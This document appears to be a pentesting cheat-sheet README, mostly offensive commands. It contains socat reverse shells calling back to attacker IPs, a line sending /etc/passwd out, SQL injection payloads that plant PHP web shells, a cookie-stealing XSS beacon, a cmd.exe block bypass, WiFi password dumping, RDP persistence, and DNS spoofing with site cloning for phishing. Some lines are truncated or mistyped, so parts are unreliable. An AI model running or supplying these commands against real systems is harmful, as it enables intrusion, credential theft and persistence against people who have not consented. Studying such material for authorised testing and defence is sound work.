# 🧠 Command-Center

Because trying to remember every switch, flag, or obscure syntax is a losing battle.  
Use your browser's `CTRL+F` like your life depends on it — because it probably does.

---

## 🔍 Where to Begin?

Looking for a rabbit hole? Start here:

- 🕵️‍♂️ **[TOR Service / Anonymity](sections/Tor_Service_Anonymity.md)**
- 🧗 **[Linux Privilege Escalation (privesc)](sections/Linux_Privilege_Escalation.md)**
- 💼 **[Windows Privilege Escalation (privesc)](sections/Windows_Privilege_Escalation_.md)**
- 🏢 **[Windows Active Directory](sections/Windows_Active_Directory.md)**
- 🖥️ **[Windows SSH Service Setup](sections/Windows_SSH_Service_Setup.md)**
- 🕳️ **[Pivoting in Metasploit](sections/Pivoting_in_Metasploit.md)**
- 💥 **[Buffer Overflow (Windows, Basic)](sections/Buffer_Overflow_Windows.md)**
- 🔐 **[GPG](sections/GPG.md)**
- 📡 **[WiFi](sections/wifi.md)**
- 🐍 **[Python3 one liners and scripts](sections/Python_One_Liners_and_scripts.md)**

---

## 🧑‍💻 Linux Users, Assemble

Create users, delete users, add to sudoers... you know, basic sysadmin sorcery.

```
sudo adduser <username>
sudo usermod -aG sudo <username>
sudo deluser --remove-home <username>
sudo deluser --remove-all-files <username>
```

---

## 🪟 Windows Shenanigans

### 🫢📜 Blocked CMD Bypass — When `cmd.exe` is banned but you still have ideas.


- create a batch file and run it with: `rundll32.exe shell32.dll, ShellExec_RunDLL C:\Windows\Users\<username>\Desktop\command.bat`
- output for the command will be written to output.txt
- can tweak it to your liking, including cmd= and enter
- great resource **[here](https://lolbas-project.github.io/lolbas/Libraries/Shell32/)**

```
@echo off
:Loop
echo %cd%^>
set /p cmd=Type your command here
%cmd% >> c:\users\<username>\desktop\output.t>
Goto Loop
```
Another stealthier example
```
@echo off

set cmd=dir
%cmd% >> c:\users\<username>\desktop\output.t>

```
### 💾📁 dir (Win) — Because Windows still loves listing files like it's 1995.

Searching in ***Windows*** using the `dir` co>

- `dir *.txt *.doc` to list any file whose na>
- `dir /a:d` to list only directories
- `dir /a:r` to list only files with the read>
- `dir /s` to list files and directories in t>
- `dir /p` to pause after each screenful of o>
- `dir /w` to list multiple file names on eve>
- `dir /s /w /p` to recursively lists all fil>
- `dir /s /w /p "C:\Program Files"` same as t>
- `dir /s /q /a:sh /p C:\Windows` Lists any f>
- `dir \ /s | find "i" | more` the above comm>
- `dir /s /a:hs /q C:\Windows > myfile.txt` r>

### 📶🔓 WiFi Passwords in Cleartext (Win) — Because Windows whispers secrets if you ask nicely.

- `netsh show profile "wifi network name" key=clear` 
- Also we can save the above info into a file: `for /f "skip=9 tokens=1,2 delims=:"  %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> wifipassword.txt`

### 🔼 AlwaysInstallElevated — because Microsoft said, "why not?"

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"
```

### 🔌🪟 netsh / Windows — Port forwarding, the Windows way (i.e., slightly painful).

- add a firewall rule and IPHelper has to be enabled
- `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.11 connectport=445 connectaddress=192.168.10.1`
- `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<local IP> localport=4455 action=allow`
- verify: `netstat -anp TCP | find "4455"`

### 🪟🔁 Persistence via RDP — PowerShell, registry, and remote regrets.

- `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
- `xfreerdp /u:<username> /p:'<password>' /v:<target IP>`
- disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnection /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`

---

## ⚙️ Ansible

Want your playbook to run like it belongs? Don't forget the trailing comma. Seriously.

```
ansible-playbook deploy.xml -K -i localhost, --connection=local
ansible-playbook deploy.xml -k -K -i <target IP>,
```

---

## 🌌 Amass

Run it before bed. Wake up to thousands of subdomains and a mild existential crisis.

```
amass -ip -d <domain.com>
```

Install steps included because no one likes broken commands.
 - `apt install snapd`
 - `service snapd start`
 - `snap install amass`
 - `snap run amass`
---

## 🧙 awk & bash

Because sometimes the terminal *is* your IDE.

- `awk` for precision cutting. Example: `echo "hello::there::friend" | awk -F "::" '{print $1, $3}'`
- `bash` for... well, *everything else* — scans, scripts, mischief.
Example bash ping scan:
```bash
#!/bin/bash

for ip in `seq 1 10`;do
pint -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
```
Example bash ping scan:
```bash
#!/bin/bash

host=10.5.5.13
for port in {1...65535};do
	timeout .1 bash -c "echo > /dev/tcp/$host/$port" &&
		echo "port $port is open"
done
echo "Done"
```
---

## 🏴‍☠️ Hacking Tools Galore

- **Binwalk:** For when JPEGs are secretly ZIPs. `binwalk somepicture.jpg -e`
- **Bloodhound:** Because AD doesn’t hide well. `bloodhound-python -u <username> -p <password> -d <domain.local> -c all`
- **Burp Suite:** Not just for web apps, also for your subdomain cravings. Finding subdomains in "target": `.*\.?example\.com$`
- **AppLocker bypass:** It's a whitelist... not a forcefield. Whitelisted by default: `c:\Windows\System32\spool\drivers\color`
- **Certbot, ExifTool, GPG, GPG2John, Hashcat, Hydra, John...** If it’s not here, it’s probably not worth using. Use their help menu, it's quite easy actually.

---

## 📡 Enumeration Madness

- DNS, LDAP, SMB, SSH, RDP, RPC, SQL, HTTP — pick your poison.
- **Sqlmap, Wfuzz, Dirsearch, Sublist3r, theHarvester...**  
All your favorite toys in one big toolbox.
- dnschef: `dnschef --fakeip=192.168.1.102 --fakedomain=<domain you pretend to be> --interface=192.168.1.102` Use `setoolkit` to serve the cloned site.
---

## 🧠 Memorable Mentions

- 🍰 `php -S 0.0.0.0:8000` – because spinning up a web server should be as easy as cake.
- 🍪 `<script>...document.cookie</script>` – mmmm, cookies...
- 💀 `copy /b cover.jpg+nc_secrets.zip secretphoto.jpg` – zip inside an image. Yes, it still works.
- 🔧 `iptables`, `tmux`, `wfuzz`, `sed`, `curl`, `wget`, `crackmapexec`, `impacket`, `powercat`, `socat`, `plink`, `msfvenom` – all the ingredients of a spicy pentest soup.

🛠️🕳️🎯chisel: 
```bash
chisel server --socks5 -p 8000 --reverse
chisel client <chisel server IP>:<PORT> R:socks
```
Don't forget to add it to your proxychains.conf
`socks5 127.0.0.1 1080`
Also to make sure you are connecting to the right server
`./chisel client --fingerprint <chisel server>`

🔐🔥 crackmapexec

- `crackmapexec -t 20 smb --shares <target> ->
- `crackmapexec winrm <target IP> -u users -H>
- `crackmapexec smb -u '' -p '' -d <domain> .>

🌐💨 curl — Because who needs a browser anyway?

You can do some great things with ***curl***,>

- `curl -s <domain or IP> | grep "<form"` to >
- `curl -X DELETE <http://IP:PORT>` if you ge>
<l qrenco.de/https://google.com`

---
💣🧠 grep + regex = IP extraction magic

- `grep -o ‘[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}’ nmapfile.txt`

---

## 🌐🧠 DNS — Because everything starts with a name.

- `dig axfr ms01.thinc.local @10.1.1.113`
- `host www.example.com`  
- `host -t mx example.com`
- build possible hostnames to list.txt
- reverse lookup brute force: `for ip in $(seq 50 100);do host 38.100.193.$ip;done|grep -v "not found"`
- Zone transfer: `host -l example.com ns1.example.com`
- finding nameservers: `host -t ns example.com | cut -d " " -f 4`
- with script:

```bash
#!/bin/bash

#Simple Zone Transfer Bash Script
#$1 is the first argument given after the bash script
#Check if argument was given, if not, print usage

if [ -z "$1" ]; then
        echo "[*] Simple Zone Transfer Script"
        echo "[*] Usage: $0 <domain name>"
        exit 0
fi
```
- if argument was given, identify the DNS servers for the domain

```bash
for server in $(host -t ns $1 | cut -d " " -f 4);do
	host -l $1 $server | grep "has address"
done
```

---
## 🧬📚 LDAP Enumeration — Reading the corporate family tree like a gossip mag.

- `ldapsearch -v -x -H ldap://192.168.111.121 -D '' -w '' -b "DC=prime,DC=sec"`
- `ldapsearch -v -x -D <username>@PRIME.SEC -w <password> -b "DC=prime,DC=sec -H ldap://192.168.111.101 "(ms-MC-AdmPwd=*)" ms-MCS-AdmPwd`

---
## 🧪🔒 Local HTTPS Python Server — When Python and certs join forces.

- generate certs: `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`
- generate cert.pfx file: `openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem`
- import it to browser as trusted cert
- start below python3 script
```python
import http.server
import ssl

# define the server handler
handler=http.server.SimpleHTTPRequestHandler

# start the server 
httpd=http.server.HTTPServer(('0.0.0.0', 443), handler)

# wrap the server with SSL
httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='cert.pem',keyfile='key.pem',ssl_version=ssl.PROTOCOL_TLS)

print("Serving on https://0.0.0.0:443")
httpd.serve_forever()
```
---

## 🧨🛠️ Metasploit: Collation Version Fix — Because databases love to break when you're on a roll.

```bash
sudo -u postgres psql
\l
ALTER DATABASE msf REFRESH COLLATION VERSION;
ALTER DATABASE postgres REFRESH COLLATION VERSION;
```

---

## 🔄⚡ socat — The Swiss Army knife of TCP wizardry.

- `socat -d -d TCP-LISTEN:1234 -`
- `socat -d -d TCP-CONNECT:127.0.0.1:1234 -`
- **as a redirector:** `socat TCP-LISTEN:80,fork,reuseaddr TCP:<IP>:<PORT>`
- **transferring files:**
  - `socat -d -d TCP-LISTEN:1234 OPEN:filetransfer.txt,create`
  - `socat -d -d TCP-CONNECT:127.0.0.1:1234 FILE:/etc/passwd`
- **listener for reverse shell:** `socat -d -d TCP-LISTEN:443 STDOUT`
- **executing commands on Win:**
  - `socat -d -d TCP-LISTEN:1234 EXEC:'cmd.exe',pipes`
- **executing cmd exe from Win to connect back to Kali:**
  - `socat TCP4:192.168.119.198:443 EXE:`
- **encrypted reverse shell:** `socat -d -d OPENSSL-LISTEN:5557,cert=bind)shell.pem,verify=0,fork STDOUT`
- **connecting back with encryption from Windows**
  - `socat OPENSSL:192.168.10.10:5556,verify=0 EXEC: 'cmd.exe',pipes`
- **if victim was a Linux machine this is the syntax**
  - `socat OPENSSL:192.168.10.10:5556,verify=0 EXEC:/bin/bash`
- You also have to generate a certificate first
  - `openssl reqe -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt`
  - Above will create the key file named `bind.key`, to convert it to a .pem file see below
  - `cat bind.key bind.crt > bind.pem`

---

## 🐍💾 SQL (Command Execution) — Because sometimes the database *is* the web shell.

- into outfile: `SELECT “<?php system($_GET['cmd']); ?>” into outfile “/var/www/WEBROOT/backups”`
- command and code execution: (http)
    - `http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:\Windows\System32\drivers\etc\hosts)'` 
    - `http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']); ?>)" INTO OUTFILE  'c:/xampp/htdocs/backdoor.php'` and then: `http://10.10.10.10/backdoor.php?cmd=ipconfig`

---

## 💉🛠️ sqlmap — Automating mayhem, one parameter at a time.

- `sqlmap -u http://sqli.site/view.php -D <db_name> -T <table_name ex: users> -C  <username.password> --dump`
- `sqlmap -u http://sqli.view.php -D <db_name> > -T <table_name> --dump-all` 
- `sqlmap -u http://sqli.view.php?id=1 --users` 
- `sqlmap -u http://sqli.view.php?id=1 --tor-type=SOCKS5` 
- `sqlmap -u http://sqli.view.php?id=1 --dbs`
- `sqlmap -u http://sqli.view.php -D <db_name> --tables` 

Using the session cookies and sqlmap: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

If the target is vulnerable for the get request (see above) we can get a shell out of it: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`

---

## 🍪 Cookie stealing

- `<script>new Image().src="http://<python3 h>`

---

## 🧰 Docker, Raspberry Pi, VirtualBox, WireGuard

Whether you’re in a lab, a VM, or a Raspberry Pi taped behind your router.
This section would be too extensive, use the documentation or help menu, but because I'm nice, passing on a few docker-fu commands.

🐳⚙️ Docker — Because setting up an OS should only take 3 seconds.

- test if it's working: `docker run hello-world`
- `docker run --help` - to list all flags this command supports
- `docker search <TERM>` - to search for a Docker container
- `docker pull busybox` - to pull down busybox
- `docker run -it busybox` - to run busybox, the `it` attaches us to an interactive container
- `docker ps -a` - to check running docker containers and their ID
- `docker exec -it <container ID> /bin/bash` - to enter a Docker container
- `docker rm <container ID>` - to remove a docker container
- `docker rm $(docker ps -a -q -f status=exited)` - if you have a bunch of containers to delete in one go, copy-pasting IDs can be tedious. In that case, you can simply run this command. The `q` flag returns only the numeric IDs and the `f` filters output based on conditions provided.
- `docker container prune` - in later versions of Docker, this command can be used to remove all stopped containers
- `docker container ls` - lists all containers
- `docker image list` - list all pulled images
- `docker rmi <image ID>` - from the above command get image ID and this command will delete the pulled image
- `docker network ls` - lists Docker images running on network

---

## 🛡️ DEFENSE… but, make it optional

Check the sections on `iptables`, `tmux.conf`, `bashrc`, and **two default gateway configs** —  
so your lab network doesn’t accidentally email your boss.

---

## 💣 Shell Upgrades

Upgrade your shell like it’s a Tesla software update.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

---

## 🚨 TL;DR

- This isn’t a tutorial, it’s a *field manual*.
- Everything in here is for educational purposes only.
- Anything you do is on you. Seriously. Be cool.

---

## 💡 Pro Tip

It's not the commands. It's *how* you use them, when you use them, and what you do next.  
Happy hacking 👾

---

![Hacker Vibes Only](/images/003_hacker_hoodie.jpg)
